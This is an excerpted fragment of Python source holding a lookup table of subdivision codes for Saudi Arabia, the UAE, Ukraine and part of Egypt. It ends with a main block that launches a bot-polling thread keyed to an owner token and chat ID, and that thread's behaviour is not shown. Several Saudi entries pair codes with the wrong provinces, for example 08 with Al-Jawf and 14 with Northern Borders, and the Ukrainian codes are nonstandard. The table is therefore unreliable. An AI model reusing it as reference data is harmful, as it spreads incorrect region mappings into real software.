        {'code':'SIN','name':'South Sinai'},{'code':'SUZ','name':'Suez'},
    ],
    'SA': [
        {'code':'01','name':'Riyadh'},{'code':'02','name':'Makkah'},{'code':'03','name':'Madinah'},
        {'code':'04','name':'Eastern Province'},{'code':'05','name':'Al-Qassim'},
        {'code':'06','name':'Hail'},{'code':'07','name':'Tabuk'},{'code':'08','name':'Al-Jawf'},
        {'code':'09','name':'Jizan'},{'code':'10','name':'Asir'},
        {'code':'11','name':'Najran'},{'code':'12','name':'Al-Baha'},{'code':'14','name':'Northern Borders'},
    ],
    'AE': [
        {'code':'AJ','name':'Ajman'},{'code':'AZ','name':'Abu Dhabi'},{'code':'DU','name':'Dubai'},
        {'code':'FU','name':'Fujairah'},{'code':'RK','name':'Ras al-Khaimah'},
        {'code':'SH','name':'Sharjah'},{'code':'UQ','name':'Umm al-Quwain'},
    ],
    'PK': [
    ...
    'UA': [
        {'code':'CK','name':'Cherkasy'},{'code':'CH','name':'Chernihiv'},{'code':'CV','name':'Chernivtsi'},
        {'code':'DP','name':'Dnipropetrovsk'},{'code':'DT','name':'Donetsk'},{'code':'IF','name':'Ivano-Frankivsk'},
        {'code':'KH','name':'Kharkiv'},{'code':'KS','name':'Kherson'},{'code':'KM','name':'Khmelnytskyi'},
        {'code':'KV','name':'Kyiv'},{'code':'KC','name':'Kyiv City'},{'code':'KR','name':'Kirovohrad'},
        {'code':'LH','name':'Luhansk'},{'code':'LV','name':'Lviv'},{'code':'MY','name':'Mykolaiv'},
        {'code':'OD','name':'Odessa'},{'code':'PL','name':'Poltava'},{'code':'RV','name':'Rivne'},
        {'code':'SM','name':'Sumy'},{'code':'TP','name':'Ternopil'},{'code':'VI','name':'Vinnytsia'},
        {'code':'VL','name':'Volyn'},{'code':'ZP','name':'Zaporizhzhia'},{'code':'ZK','name':'Zakarpattia'},
...
if __name__ == '__main__':
    if OWNER_BOT_TOKEN and OWNER_CHAT_ID:
        t = threading.Thread(target=_bot_polling, daemon=True)
        t.start()
